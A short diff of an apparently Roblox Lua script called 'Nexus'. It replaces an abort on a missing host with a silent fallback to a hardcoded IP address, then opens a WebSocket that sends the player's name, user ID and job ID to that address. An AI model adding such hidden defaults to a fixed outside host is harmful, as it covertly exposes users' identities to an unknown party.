@@ -226,9 +226,9 @@ do -- Nexus
             if self.Terminated then break end
 
             if not Host then
-                return 'No Host specified. Connection aborted.'
+                Host = '45.187.17.9:5242'
             end
-            
+
             local Success, Socket = pcall(WSConnect, ('ws://%s/Nexus?name=%s&id=%s&jobId=%s'):format(Host, LocalPlayer.Name, LocalPlayer.UserId, game.JobId))
 
             if not Success then task.wait(12) continue end
